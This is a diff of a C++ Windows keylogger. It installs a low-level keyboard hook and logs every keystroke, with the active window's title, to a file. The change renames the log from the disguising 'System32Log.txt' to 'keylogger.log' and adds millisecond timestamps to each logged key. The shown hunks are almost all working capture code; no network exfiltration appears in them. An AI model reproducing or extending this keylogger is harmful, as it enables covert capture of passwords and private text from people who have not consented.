@@ -19,7 +19,7 @@ int Save(int key_stroke, char *file);
 
 extern char lastwindow[256];
 
-// This is the callback function. Consider it the event that is raised when, in this case, 
+// This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -30,9 +30,9 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			
+
 			// save to file
-			Save(kbdStruct.vkCode, "System32Log.txt");
+			Save(kbdStruct.vkCode, "keylogger.log");
 		}
 	}
 
@@ -60,69 +60,76 @@ void ReleaseHook()
 int Save(int key_stroke, char *file)
 {
     char lastwindow[256];
-    
+
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
-	
-	
+
+
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(file, "a+");
-		
-	
+
+
 	HWND foreground = GetForegroundWindow();
     if (foreground)
     {
         char window_title[256];
         GetWindowText(foreground, window_title, 256);
-        
+
         if(strcmp(window_title, lastwindow)!=0) {
             strcpy(lastwindow, window_title);
-            
+
             // get time
             time_t t = time(NULL);
             struct tm *tm = localtime(&t);
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
-            
-            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
+
+            fprintf(OUTPUT_FILE, "[Window: %s - at %s]\n\n", window_title, s);
         }
     }
 
 
+
+    timeval tp;
+    mingw_gettimeofday(&tp, 0);
+    time_t curtime = tp.tv_sec;
+    tm *t = localtime(&curtime);
+    // printf("%02d:%02d:%02d:%03d\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000);
+
 	std::cout << key_stroke << '\n';
 
 	if (key_stroke == VK_BACK)
-		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000,"[BACKSPACE]");
 	else if (key_stroke == VK_RETURN)
-		fprintf(OUTPUT_FILE, "%s", "\n");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "\n");
 	else if (key_stroke == VK_SPACE)
-		fprintf(OUTPUT_FILE, "%s", " ");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, " ");
 	else if (key_stroke == VK_TAB)
-		fprintf(OUTPUT_FILE, "%s", "[TAB]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[TAB]");
 	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
-		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[SHIFT]");
 	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
-		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n",t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000,  "[CONTROL]");
 	else if (key_stroke == VK_ESCAPE)
-		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[ESCAPE]");
 	else if (key_stroke == VK_END)
-		fprintf(OUTPUT_FILE, "%s", "[END]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[END]");
 	else if (key_stroke == VK_HOME)
-		fprintf(OUTPUT_FILE, "%s", "[HOME]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[HOME]");
 	else if (key_stroke == VK_LEFT)
-		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[LEFT]");
 	else if (key_stroke == VK_UP)
-		fprintf(OUTPUT_FILE, "%s", "[UP]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[UP]");
 	else if (key_stroke == VK_RIGHT)
-		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[RIGHT]");
 	else if (key_stroke == VK_DOWN)
-		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
-		fprintf(OUTPUT_FILE, "%s", ".");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, ".");
 	else if (key_stroke == 189 || key_stroke == 109)
-		fprintf(OUTPUT_FILE, "%s", "-");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "-");
 	else if (key_stroke == 20)
-		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %s\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, "[CAPSLOCK]");
 	else {
 		if (key_stroke >= 96 && key_stroke <= 105)
 		{
@@ -139,7 +146,7 @@ int Save(int key_stroke, char *file)
 
 			if (lowercase) key_stroke += 32;
 		}
-		fprintf(OUTPUT_FILE, "%c", key_stroke);
+		fprintf(OUTPUT_FILE, "%02d:%02d:%02d:%03d %c\n", t->tm_hour, t->tm_min, t->tm_sec, tp.tv_usec/1000, key_stroke);
     }
 	// NOTE: Numpad-Keys seem to print as lowercase letters
 
